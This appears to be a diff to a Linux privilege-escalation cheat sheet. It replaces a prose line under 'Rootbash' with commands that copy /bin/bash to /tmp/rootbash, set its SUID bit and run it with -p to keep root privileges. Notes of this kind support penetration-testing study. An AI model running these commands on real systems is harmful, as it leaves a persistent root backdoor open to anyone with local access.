@@ -27,7 +27,10 @@ dpkg -l
 
 ### Rootbash
 
-Create copy of `/bin/bash` as `/bin/rootbash` , then run `/bin/rootbash -p`
+```text
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+/tmp/rootbash -p
+```
 
 ### Executable
 
